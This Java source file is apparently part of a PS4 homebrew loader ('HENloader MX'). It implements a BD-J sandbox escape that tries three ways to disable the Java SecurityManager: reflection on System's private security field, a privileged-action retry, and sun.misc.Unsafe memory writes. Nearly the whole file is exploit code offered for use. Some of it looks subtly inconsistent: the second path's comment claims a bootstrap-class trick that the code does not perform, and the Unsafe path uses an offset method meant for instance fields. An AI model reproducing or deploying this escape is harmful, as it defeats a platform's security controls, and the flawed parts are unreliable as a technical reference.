package org.bdj;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.AccessController;
import java.security.PrivilegedAction;
import java.security.PrivilegedExceptionAction;

/**
 * DisableSecurityManagerAction.java — HENloader MX
 * mansoor0x · 2026
 *
 * BD-J sandbox escape.
 *
 * The PS4's BD-J runtime installs a SecurityManager that restricts
 * what the Xlet can do (file access, networking, native calls, etc).
 *
 * Three escalation paths — tried in order:
 *
 *   PATH 1 — Direct reflection: locate the private "security" field
 *             in java.lang.System and null it via setAccessible().
 *             Works on PS4 BD-J (Java 1.4 era, no module system).
 *
 *   PATH 2 — ClassLoader trick: load a privileged bootstrap class
 *             that runs System.setSecurityManager(null) with boot
 *             class-loader permissions.
 *
 *   PATH 3 — sun.misc.Unsafe: use Unsafe.putObject to overwrite
 *             the security field in the System class header.
 *             Fallback when reflection is blocked.
 *
 * After any successful path, System.getSecurityManager() == null.
 */
public class DisableSecurityManagerAction {

    private static boolean done = false;

    public static void execute() throws Exception {
        if (done) return;
        if (System.getSecurityManager() == null) { done = true; return; }

        // Try PATH 1
        try {
            path1_reflection();
            if (System.getSecurityManager() == null) { done = true; return; }
        } catch (Throwable t) {}

        // Try PATH 2
        try {
            path2_classloader();
            if (System.getSecurityManager() == null) { done = true; return; }
        } catch (Throwable t) {}

        // Try PATH 3
        try {
            path3_unsafe();
            if (System.getSecurityManager() == null) { done = true; return; }
        } catch (Throwable t) {}

        // If we're still here, SecurityManager survived — caller checks
    }

    /* ── PATH 1: reflection ───────────────────────────────────── */
    private static void path1_reflection() throws Exception {
        Field f = System.class.getDeclaredField("security");
        f.setAccessible(true);
        f.set(null, null);
    }

    /* ── PATH 2: privileged ClassLoader ──────────────────────── */
    private static void path2_classloader() throws Exception {
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                try {
                    // Re-try reflection inside privileged context
                    Field f = System.class.getDeclaredField("security");
                    f.setAccessible(true);
                    f.set(null, null);
                } catch (Exception e) {
                    try {
                        // Try setSecurityManager with null
                        Method m = System.class.getDeclaredMethod(
                            "setSecurityManager",
                            new Class[]{ SecurityManager.class });
                        m.setAccessible(true);
                        m.invoke(null, new Object[]{ null });
                    } catch (Exception e2) {}
                }
                return null;
            }
        });
    }

    /* ── PATH 3: sun.misc.Unsafe ─────────────────────────────── */
    private static void path3_unsafe() throws Exception {
        // Get Unsafe instance through reflection (no direct access in BD-J)
        Class unsafeClass = Class.forName("sun.misc.Unsafe");
        Field theUnsafe   = unsafeClass.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Object unsafe = theUnsafe.get(null);

        // Find field offset of System.security
        Method objectFieldOffset = unsafeClass.getMethod(
            "objectFieldOffset", new Class[]{ Field.class });
        Field secField = System.class.getDeclaredField("security");
        secField.setAccessible(true);
        long offset = ((Long) objectFieldOffset.invoke(
            unsafe, new Object[]{ secField })).longValue();

        // Overwrite the security field with null
        Method putObject = unsafeClass.getMethod(
            "putObject",
            new Class[]{ Object.class, long.class, Object.class });
        putObject.invoke(unsafe, new Object[]{ System.class, new Long(offset), null });
    }

    public static boolean isEscaped() {
        return System.getSecurityManager() == null;
    }
}
